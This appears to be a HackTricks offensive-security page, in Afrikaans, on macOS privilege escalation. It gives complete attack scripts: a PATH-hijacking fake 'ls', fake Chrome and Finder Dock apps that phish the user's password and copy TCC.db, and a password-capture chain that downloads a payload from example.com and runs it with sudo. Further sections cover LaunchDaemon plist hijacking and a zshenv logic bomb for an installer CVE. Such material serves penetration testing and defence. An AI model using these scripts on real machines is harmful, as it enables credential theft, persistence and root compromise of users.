# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

As jy hier is op soek na TCC privilege escalation, gaan na:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Let daarop dat **die meeste van die truuks oor privilege escalation wat Linux/Unix raak, ook MacOS**-masjiene sal raak. Sien dus:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Gebruikersinteraksie

### Sudo Hijacking

Jy kan die oorspronklike [Sudo Hijacking-tegniek in die Linux Privilege Escalation-plasing vind](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

macOS **behou** egter die gebruiker se **`PATH`** wanneer hy **`sudo`** uitvoer. Dit beteken dat ’n ander manier om hierdie aanval uit te voer, sou wees om **ander binaries te hijack** wat die slagoffer steeds sal uitvoer wanneer hy **sudo uitvoer:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Let daarop dat 'n gebruiker wat die terminal gebruik, hoogs waarskynlik **Homebrew geïnstalleer het**. Dit is dus moontlik om binaries in **`/opt/homebrew/bin`** te kaap.

### Dock Impersonation

Deur **social engineering** te gebruik, kan jy byvoorbeeld **Google Chrome** binne die Dock **naboots** en eintlik jou eie script uitvoer:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Enkele voorstelle:

- Kyk in die Dock of daar 'n Chrome is, en indien wel, **verwyder** daardie inskrywing en **voeg** die **fake** **Chrome-inskrywing op dieselfde posisie** in die Dock-array **by**.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Enkele voorstelle:

- Jy **kan Finder nie uit die Dock verwyder nie**, dus, as jy dit by die Dock gaan voeg, kan jy die vals Finder net langs die regte een plaas. Hiervoor moet jy **die vals Finder-inskrywing aan die begin van die Dock-skikking voeg**.
- Nog ’n opsie is om dit nie in die Dock te plaas nie en dit net oop te maak; “Finder vra om Finder te beheer” is nie besonder vreemd nie.
- Nog ’n opsie om **sonder om te vra na root te eskaleer** vir die wagwoord met ’n aaklige venster, is om Finder werklik vir die wagwoord te laat vra om ’n bevoorregte aksie uit te voer:
- Vra Finder om ’n nuwe **`sudo`-lêer** na **`/etc/pam.d`** te kopieer. (Die versoek wat vir die wagwoord vra, sal aandui dat “Finder sudo wil kopieer”.)
- Vra Finder om ’n nuwe **Authorization Plugin** te kopieer. (Jy kan die lêernaam beheer sodat die versoek wat vir die wagwoord vra, sal aandui dat “Finder Finder.bundle wil kopieer”.)

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware misbruik gereeld user interaction om ’n **sudo-capable password vas te vang** en dit programmaties te hergebruik. ’n Algemene vloei:

1. Identifiseer die aangemelde gebruiker met `whoami`.
2. **Herhaal password prompts** totdat `dscl . -authonly "$user" "$pw"` suksesvol terugkeer.
3. Cache die credential (bv. `/tmp/.pass`) en voer bevoorregte aksies uit met `sudo -S` (password oor stdin).

Voorbeeld van ’n minimale ketting:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
Die gesteelde wagwoord kan dan hergebruik word om **Gatekeeper quarantine met `xattr -c` te verwyder**, LaunchDaemons of ander bevoorregte lêers te kopieer, en bykomende fases nie-interaktief uit te voer.<sup>[[1]](#references)</sup>

## Nuwer macOS-spesifieke vektore (2023–2025)

### Verouderde `AuthorizationExecuteWithPrivileges` steeds bruikbaar

`AuthorizationExecuteWithPrivileges` is in 10.7 verouderd verklaar, maar **werk steeds op Sonoma/Sequoia**. Baie kommersiële updaters roep `/usr/libexec/security_authtrampoline` met ’n onbetroubare pad aan. As die teikenbinêr deur die gebruiker beskryfbaar is, kan jy ’n trojan plant en op die wettige prompt meery:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Kombineer met die **masquerading tricks hierbo** om ’n geloofwaardige wagwoorddialoog aan te bied.


### Privileged helper / XPC-triage

Baie moderne derdeparty-macOS-privescs volg dieselfde patroon: ’n **root LaunchDaemon** stel ’n **Mach/XPC service** vanuit **`/Library/PrivilegedHelperTools`** bloot; daarna valideer die helper óf **nie die client nie**, valideer dit **te laat** (PID race), óf stel dit ’n **root method** bloot wat ’n **user-controlled path/script** verbruik. Dit is die bug-klas agter baie onlangse helper-bugs in VPN-clients, game launchers en updaters.<sup>[[2]](#references)</sup>

Vinnige triage-kontrolelys:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Gee veral aandag aan helpers wat:

- aanhou om versoeke te aanvaar **ná uninstall** omdat die job in `launchd` gelaai gebly het
- scripts uitvoer of konfigurasie lees vanaf **`/Applications/...`** of ander paaie wat deur nie-root-gebruikers skryfbaar is
- op **PID-based** of **bundle-id-only** peer validation staatmaak wat raceable kan wees

Vir meer besonderhede oor helper authorization bugs, raadpleeg [hierdie bladsy](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### PackageKit script environment inheritance (CVE-2024-27822)

Totdat Apple dit in **Sonoma 14.5**, **Ventura 13.6.7** en **Monterey 12.7.5** reggestel het, kon user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** **PKG scripts as root binne die huidige gebruiker se omgewing** uitvoer. Dit beteken dat ’n package wat **`#!/bin/zsh`** gebruik, die aanvaller se **`~/.zshenv`** sou laai en dit as **root** uitvoer wanneer die slagoffer die package geïnstalleer het.<sup>[[3]](#references)</sup>

Dit is veral interessant as ’n **logic bomb**: jy benodig slegs ’n foothold in die gebruiker se account en ’n skryfbare shell-opstartlêer, waarna jy wag totdat enige kwesbare **zsh-based** installer deur die gebruiker uitgevoer word. Dit is oor die algemeen nie van toepassing op **MDM/Munki** deployments nie, omdat hulle binne die root-gebruiker se omgewing loop.<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
As jy dieper wil delf in installer-spesifieke misbruik, kyk ook na [hierdie bladsy](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist-kaping (CVE-2025-24085-patroon)

As ’n LaunchDaemon plist of sy `ProgramArguments`-teiken **deur die gebruiker geskryf kan word**, kan jy eskaleer deur dit te vervang en dan launchd te dwing om dit te herlaai:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Dit weerspieël die exploit-patroon wat vir **CVE-2025-24085** gepubliseer is, waar ’n skryfbare plist misbruik is om aanvallerkode as root uit te voer.

### XNU SMR credential race (CVE-2025-24118)

’n **race in `kauth_cred_proc_update`** laat ’n plaaslike aanvaller toe om die leesalleen-credential-aanwyser (`proc_ro.p_ucred`) te korrupteer deur `setgid()`/`getgid()`-lusse oor threads heen te laat race totdat ’n geskeurde `memcpy` plaasvind. Suksesvolle korrupsie lewer **uid 0** en toegang tot kernel-geheue. Minimale PoC-struktuur:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Kombineer dit met heap grooming om beheerde data te plaas waar die pointer weer gelees word. Op kwesbare builds is dit 'n betroubare **local kernel privesc** sonder vereistes vir SIP bypass.<sup>[[4]](#references)</sup>

### SIP bypass via Migration Assistant ("Migraine", CVE-2023-32369)

As jy reeds root het, blokkeer SIP steeds skry bewerkings na stelselliggings. Die **Migraine**-bug misbruik die Migration Assistant-entitlement `com.apple.rootless.install.heritable` om 'n child process te skep wat SIP bypass erf en beskermde paaie oorskryf (byvoorbeeld `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Die ketting:

1. Verkry root op 'n lopende stelsel.
2. Trigger `systemmigrationd` met vervaardigde state om 'n attacker-controlled binary uit te voer.
3. Gebruik die geërfde entitlement om SIP-beskermde lêers te patch, wat selfs ná 'n reboot voortduur.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Veelvuldige Apple-daemons aanvaar **NSPredicate**-objects oor XPC en valideer slegs die `expressionType`-veld, wat deur die aanvaller beheer word. Deur 'n predicate te vervaardig wat arbitrêre selectors evalueer, kan jy **code execution in root/system XPC services** verkry (byvoorbeeld `coreduetd`, `contextstored`). Wanneer dit met 'n aanvanklike app sandbox escape gekombineer word, verleen dit **privilege escalation sonder user prompts**. Soek na XPC endpoints wat predicates deserializeer en nie 'n robuuste visitor het nie.<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Enige user** (selfs unprivileged users) kan 'n Time Machine snapshot met `-o noowners` skep en mount, en **AL die lêers** van daardie snapshot access, wat die ownership checks op die live volume omseil. Die enigste privilege wat benodig word, is dat die application wat gebruik word (soos `Terminal`) **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) moet hê.

Die commands en die volledige verduideliking is op die TCC bypasses-bladsy:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Sensitiewe Inligting

Dit kan nuttig wees om privileges te escalate:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## References

- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)

{{#include ../../banners/hacktricks-training.md}}
